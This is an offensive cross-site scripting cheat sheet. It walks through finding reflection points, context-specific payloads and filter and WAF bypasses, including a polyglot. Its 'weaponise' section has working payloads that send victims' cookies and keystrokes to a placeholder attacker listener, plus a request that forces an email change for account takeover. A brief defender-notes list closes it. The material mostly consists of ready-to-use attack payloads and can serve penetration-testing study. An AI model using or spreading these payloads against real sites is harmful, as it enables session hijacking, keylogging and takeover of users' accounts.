XSS (Cross-Site Scripting) - Cheat Sheet

Inject JavaScript that runs in another user's browser in the context of the
target site - to steal sessions/cookies, capture keystrokes, forge requests as
the victim, or take over accounts. Three types: Reflected, Stored, DOM-based.
Replace the placeholders (<...>) with your own values.


The three types
  - Reflected : payload in the request is echoed straight back in the response
                (search boxes, error messages). Needs the victim to click a link.
  - Stored    : payload is saved server-side (comments, profiles) and runs for
                everyone who views it. Highest impact.
  - DOM-based : client-side JS writes attacker input into the page (location.hash,
                document.write, innerHTML) - never touches the server.


Step 1 - Find where input reflects

Enter a unique marker (e.g. xss7391) in every field/param and search the
response + DOM for it. Where it lands decides the payload (the "context").

    ?q=xss7391      -> view source + inspect DOM for xss7391


Step 2 - Confirm execution (start simple)

    <script>alert(1)</script>
    "><script>alert(1)</script>
    <img src=x onerror=alert(1)>
    <svg onload=alert(1)>

alert(document.domain) proves which origin it runs in (matters with iframes).


Step 3 - Payload by context (breaking out matters)

HTML body:            <script>alert(1)</script>  /  <img src=x onerror=alert(1)>
HTML attribute:       "><svg onload=alert(1)>     (close the attribute/tag first)
                      " autofocus onfocus=alert(1) x="
Inside <script> JS:   ';alert(1)//   /   </script><script>alert(1)</script>
URL / href:           javascript:alert(1)
DOM sink:             #<img src=x onerror=alert(1)>   (via location.hash)


Step 4 - Filter / WAF bypasses

    Case/obfuscation:   <ScRiPt>  <img src=x oNerror=alert(1)>
    No parentheses:     <img src=x onerror=alert`1`>
    No "script" allowed:<svg/onload=alert(1)>  <body onload=alert(1)>  <details open ontoggle=alert(1)>
    Encoded:            &#60;script&#62;  /  <script>  /  URL/double-URL encode
    Event handlers:     onmouseover, onerror, onload, onfocus, ontoggle, onanimationstart
    Attribute break:    add "> or '> to escape the current attribute
    Polyglot (try one string everywhere):
        jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e


Step 5 - Weaponise (impact)

    // steal cookies (if not HttpOnly) to your listener:
    <script>new Image().src='http://<your-ip>/c?'+document.cookie</script>
    <script>fetch('http://<your-ip>/c?'+document.cookie)</script>

    // steal a non-HttpOnly session, then reuse it in your browser
    // keylogger:
    <script>document.onkeypress=e=>fetch('http://<your-ip>/k?'+e.key)</script>

    // force an action as the victim (CSRF via XSS - defeats CSRF tokens):
    <script>fetch('/account/email',{method:'POST',body:'email=attacker@x.com',credentials:'include'})</script>

HttpOnly cookies can't be read by JS - pivot to session-riding (act as the
victim via fetch with credentials) or account takeover (change email/password).


Step 6 - Tools

    dalfox url "http://<target>/?q=FUZZ"          # fast automated XSS scanner
    XSStrike -u "http://<target>/?q=test"          # payload gen + WAF bypass
    # Burp: Repeater for manual, or the scanner (Pro). Use a hosted collector
    # (interactsh / your server) to catch blind/stored XSS callbacks.


Defender notes (for the report)
  - Output-encode by context (HTML/attr/JS/URL); use a strict Content-Security-Policy.
  - HttpOnly on session cookies; SameSite; framework auto-escaping; avoid innerHTML.


Key idea: XSS is code execution in the victim's browser under the site's
origin. Whatever the user can do on that site, your JavaScript can do too -
read their session, submit forms as them, exfil data. The type (reflected /
stored / DOM) sets the delivery, and the reflection context sets the payload;
the win is turning "alert(1)" into a stolen session or a forced account action.
